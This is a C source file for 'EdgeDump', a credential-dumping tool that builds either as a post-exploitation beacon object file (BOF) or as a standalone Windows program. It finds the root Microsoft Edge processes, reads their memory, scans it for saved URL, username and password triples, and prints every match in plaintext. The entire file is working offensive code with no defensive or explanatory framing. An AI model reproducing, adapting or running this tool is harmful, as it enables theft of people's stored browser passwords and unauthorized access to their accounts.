/*
 * edgedump.c - Dump saved credentials from Edge process memory
 *
 * BOF:        x86_64-w64-mingw32-gcc -c -DBOF edgedump.c -o edgedump.x64.o
 * Standalone: x86_64-w64-mingw32-gcc edgedump.c -o edgedump.exe -lkernel32
 */

#include <windows.h>
#include <tlhelp32.h>

#ifdef BOF

#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*  MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void*  MSVCRT$memcpy(void*, const void*, size_t);

#define CreateToolhelp32Snapshot  KERNEL32$CreateToolhelp32Snapshot
#define Process32FirstW          KERNEL32$Process32FirstW
#define Process32NextW           KERNEL32$Process32NextW
#define OpenProcess              KERNEL32$OpenProcess
#define VirtualQueryEx           KERNEL32$VirtualQueryEx
#define ReadProcessMemory        KERNEL32$ReadProcessMemory
#define CloseHandle              KERNEL32$CloseHandle
#define VirtualAlloc             KERNEL32$VirtualAlloc
#define VirtualFree              KERNEL32$VirtualFree
#define memset                   MSVCRT$memset
#define memcpy                   MSVCRT$memcpy

#define PRINT(...)  BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)

#else

#include <stdio.h>
#include <string.h>
#define PRINT(...)  printf(__VA_ARGS__); printf("\n")

#endif

#define MAX_FIELD    256
#define MAX_RESULTS  64
#define MAX_READ     (4 * 1024 * 1024)

static int is_alpha(unsigned char c) {
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
}

static int is_user_char(unsigned char c) {
    if (c >= 'a' && c <= 'z') return 1;
    if (c >= 'A' && c <= 'Z') return 1;
    if (c >= '0' && c <= '9') return 1;
    return c == '-' || c == '_' || c == '.' || c == '@' || c == '?';
}

static int is_pass_char(unsigned char c) {
    return c >= 0x21 && c <= 0x7E;
}

static int is_url_char(unsigned char c) {
    if (c >= 'a' && c <= 'z') return 1;
    if (c >= 'A' && c <= 'Z') return 1;
    if (c >= '0' && c <= '9') return 1;
    return c == '-' || c == '.' || c == '_' || c == '~' || c == ':' ||
           c == '/' || c == '?' || c == '#' || c == '[' || c == ']' ||
           c == '@' || c == '!' || c == '$' || c == '&' || c == '\''||
           c == '(' || c == ')' || c == '*' || c == '+' || c == ',' ||
           c == ';' || c == '=' || c == '%';
}

static DWORD g_hashes[256];
static int   g_nhash;

static DWORD djb2(const char *a, const char *b, const char *c) {
    DWORD h = 5381;
    while (*a) h = ((h << 5) + h) ^ (unsigned char)*a++;
    while (*b) h = ((h << 5) + h) ^ (unsigned char)*b++;
    while (*c) h = ((h << 5) + h) ^ (unsigned char)*c++;
    return h;
}

static int already_seen(DWORD h) {
    int i;
    for (i = 0; i < g_nhash; i++)
        if (g_hashes[i] == h) return 1;
    return 0;
}

typedef struct {
    char url [MAX_FIELD];
    char user[MAX_FIELD];
    char pass[MAX_FIELD];
} Cred;

static Cred *g_creds;
static int   g_ncred;

/* Pattern: \x00\x00\x00 URL [alpha]http(s?) \x20 user \x20 pass \x20\x00 */

static void scan_region(const unsigned char *buf, SIZE_T len) {
    SIZE_T i, p, b;
    int ul, pl, lim, ok, j, url_len;

    if (len < 30) return;

    for (i = 1; i < len - 20; i++) {
        if (!is_alpha(buf[i])) continue;
        if (buf[i+1]!='h'||buf[i+2]!='t'||buf[i+3]!='t'||buf[i+4]!='p') continue;

        p = i + 5;
        if (p < len && buf[p] == 's') p++;
        if (p >= len || buf[p] != 0x20) continue;
        p++;

        SIZE_T us = p;
        ul = 0;
        while (p < len && is_user_char(buf[p]) && ul < 20) { ul++; p++; }
        if (ul < 3 || p >= len || buf[p] != 0x20) continue;
        p++;

        SIZE_T ps = p;
        pl = 0;
        while (p < len && is_pass_char(buf[p]) && pl < 40) { pl++; p++; }
        if (pl < 6) continue;
        if (p + 1 >= len || buf[p] != 0x20 || buf[p+1] != 0x00) continue;

        char url[MAX_FIELD];
        url[0] = 0;
        b = i;
        lim = 0;
        while (b >= 3 && lim < 512) {
            b--; lim++;
            if (buf[b] == 0 && buf[b-1] == 0 && buf[b-2] == 0) {
                SIZE_T url_start = b + 1;
                url_len = (int)(i + 1 - url_start);
                if (url_len > 0 && url_len < MAX_FIELD) {
                    ok = 1;
                    for (j = 0; j < url_len; j++)
                        if (!is_url_char(buf[url_start + j])) { ok = 0; break; }
                    if (ok) { memcpy(url, &buf[url_start], url_len); url[url_len] = 0; }
                }
                break;
            }
        }
        if (!url[0]) continue;

        DWORD h = djb2(url, (const char *)&buf[us], (const char *)&buf[ps]);
        if (already_seen(h)) { i = p + 1; continue; }
        if (g_nhash < 256) g_hashes[g_nhash++] = h;

        if (g_creds && g_ncred < MAX_RESULTS) {
            Cred *c = &g_creds[g_ncred++];
            memcpy(c->url, url, url_len); c->url[url_len] = 0;
            memcpy(c->user, &buf[us], ul); c->user[ul] = 0;
            memcpy(c->pass, &buf[ps], pl); c->pass[pl] = 0;
        }
        i = p + 1;
    }
}

static int wstr_is_edge(const wchar_t *s) {
    const wchar_t t[] = L"msedge.exe";
    int i = 0;
    while (t[i]) {
        wchar_t a = s[i], b = t[i];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (b >= 'A' && b <= 'Z') b += 32;
        if (a != b) return 0;
        i++;
    }
    return s[i] == 0;
}

typedef struct { DWORD pid, ppid; int edge; } ProcInfo;

static int get_root_edge_pids(DWORD *out, int max) {
    HANDLE snap = CreateToolhelp32Snapshot(0x2, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    ProcInfo *list = (ProcInfo *)VirtualAlloc(NULL, 2048 * sizeof(ProcInfo), 0x3000, 0x04);
    if (!list) { CloseHandle(snap); return 0; }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    int n = 0, count = 0, i, j;

    if (!Process32FirstW(snap, &pe)) {
        CloseHandle(snap); VirtualFree(list, 0, 0x8000); return 0;
    }
    do {
        if (n >= 2048) break;
        list[n].pid  = pe.th32ProcessID;
        list[n].ppid = pe.th32ParentProcessID;
        list[n].edge = wstr_is_edge(pe.szExeFile);
        n++;
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);

    for (i = 0; i < n; i++) {
        if (!list[i].edge) continue;
        int parent_is_edge = 0;
        for (j = 0; j < n; j++)
            if (list[j].pid == list[i].ppid && list[j].edge) { parent_is_edge = 1; break; }
        if (!parent_is_edge && count < max)
            out[count++] = list[i].pid;
    }

    VirtualFree(list, 0, 0x8000);
    return count;
}

static void scan_pid(DWORD pid) {
    HANDLE hp = OpenProcess(0x0410, FALSE, pid);
    if (!hp) return;

    MEMORY_BASIC_INFORMATION mbi;
    memset(&mbi, 0, sizeof(mbi));
    LPVOID addr = 0;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == 0x1000 && mbi.Protect == 0x04) {
            SIZE_T sz = mbi.RegionSize;
            if (sz > MAX_READ) sz = MAX_READ;

            unsigned char *buf = (unsigned char *)VirtualAlloc(NULL, sz, 0x3000, 0x04);
            if (buf) {
                SIZE_T rd = 0;
                if (ReadProcessMemory(hp, mbi.BaseAddress, buf, sz, &rd) && rd > 30)
                    scan_region(buf, rd);
                VirtualFree(buf, 0, 0x8000);
            }
        }
        ULONG_PTR next = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (next <= (ULONG_PTR)addr) break;
        addr = (LPVOID)next;
    }
    CloseHandle(hp);
}

static void run(void) {
    g_nhash = 0;
    g_ncred = 0;
    memset(g_hashes, 0, sizeof(g_hashes));

    g_creds = (Cred *)VirtualAlloc(NULL, MAX_RESULTS * sizeof(Cred), 0x3000, 0x04);
    if (!g_creds) return;
    memset(g_creds, 0, MAX_RESULTS * sizeof(Cred));

    DWORD pids[16];
    int n = get_root_edge_pids(pids, 16);

    if (!n) {
        PRINT("[-] No root msedge.exe processes found.");
    } else {
        int i;
        for (i = 0; i < n; i++)
            scan_pid(pids[i]);

        if (!g_ncred) {
            PRINT("[*] No credentials found.");
        } else {
            PRINT("");
            PRINT("  EdgeDump - %d credential(s) from %d process(es)", g_ncred, n);
            PRINT("  %-30s  %-24s  %s", "URL", "USERNAME", "PASSWORD");
            PRINT("  %-30s  %-24s  %s",
                  "------------------------------",
                  "------------------------",
                  "------------------------");
            for (i = 0; i < g_ncred; i++)
                PRINT("  %-30s  %-24s  %s",
                      g_creds[i].url, g_creds[i].user, g_creds[i].pass);
            PRINT("");
        }
    }

    VirtualFree(g_creds, 0, 0x8000);
    g_creds = NULL;
}

#ifdef BOF
void go(char *args, int len) { run(); }
#else
int main(void) { run(); return 0; }
#endif
